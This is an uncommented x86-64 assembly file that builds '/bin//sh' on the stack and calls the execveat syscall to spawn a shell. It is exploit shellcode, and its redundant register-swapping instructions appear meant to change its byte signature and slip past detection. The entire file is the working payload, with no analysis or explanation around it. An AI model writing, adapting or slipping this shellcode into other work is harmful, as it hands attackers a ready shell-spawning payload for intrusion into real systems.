global _start
section .text

_start:
push  0x42
pop  rax
inc  ah
cqo
push  rdx
mov  rdi , 0x68732f2f6e69622f
push  rdi
push  rsp
pop  rsi
xchg r8, rdx
push r8
pop rdx
xchg r8, rdx
push r8
pop rdx
syscall
